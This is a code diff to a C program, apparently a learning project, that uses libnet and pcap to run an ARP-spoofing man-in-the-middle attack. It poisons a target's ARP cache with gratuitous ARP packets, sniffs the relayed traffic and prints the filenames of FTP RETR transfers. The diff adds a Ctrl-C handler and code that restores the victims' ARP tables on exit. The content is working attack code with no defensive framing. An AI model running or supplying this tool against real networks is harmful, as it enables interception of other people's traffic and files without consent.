@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <signal.h>
 #include <libnet.h>
 #include <pcap.h>
 #include <arpa/inet.h> // ntohs
@@ -14,8 +15,9 @@ typedef struct s_vars
 	u_int8_t	*mac_target;
 	u_int8_t	*mac_attacker;
 	libnet_t	*l;
-	pcap_t		*handle;
 } t_vars;
+
+pcap_t	*g_handle;
 
 void		get_args(int ac, char **av, t_vars *vars);
 u_int8_t	*get_own_mac(libnet_t *l);
@@ -24,6 +26,7 @@ void		send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
 void 		packet_handler(u_char *args, 
 			const struct pcap_pkthdr *packet_header, const u_char *packet_body);
 pcap_t 		*open_device(char *filter_exp);
+void		handle_signal(int signal);
 
 int main(int ac, char **av)
 {
@@ -46,12 +49,20 @@ int main(int ac, char **av)
 	send_gratuitous_arp(vars.mac_attacker, vars.ip_target,
 			vars.mac_src, vars.ip_src, vars.l);
 
+	signal(SIGINT, handle_signal);
 	printf("Listening...\n");
 
-	vars.handle = open_device(NULL);
-	pcap_loop(vars.handle, 0, packet_handler, (u_char *)&vars);
+	g_handle = open_device(NULL);
+	pcap_loop(g_handle, 0, packet_handler, (u_char *)&vars);
 
-	pcap_close(vars.handle);
+	// Disinfect arp tables
+	send_gratuitous_arp(vars.mac_src, vars.ip_src,
+			vars.mac_target, vars.ip_target, vars.l);
+	send_gratuitous_arp(vars.mac_target, vars.ip_target,
+			vars.mac_src, vars.ip_src, vars.l);
+
+	// Clean up
+	pcap_close(g_handle);
 	free(vars.mac_src);
 	free(vars.mac_target);
 	libnet_destroy(vars.l);
@@ -166,7 +177,7 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
 			&& !memcmp("RETR", packet_body + 14 + 20 + 32, 4) // ether + ip + tcp
 			&& memcmp(vars->mac_attacker, eth_header->ether_shost, 6)) // attacker mac != source mac
 			printf("Transfering: %s\n", (char *)packet_body+14+20+32+5);
-		pcap_inject(vars->handle, packet_body, packet_header->caplen);
+		pcap_inject(g_handle, packet_body, packet_header->caplen);
 	}
 }
 
@@ -209,4 +220,9 @@ pcap_t *open_device(char *filter_exp)
 		}
 	}
 	return (handle);
+}
+
+void handle_signal(int signal)
+{
+	pcap_breakloop(g_handle);
 }
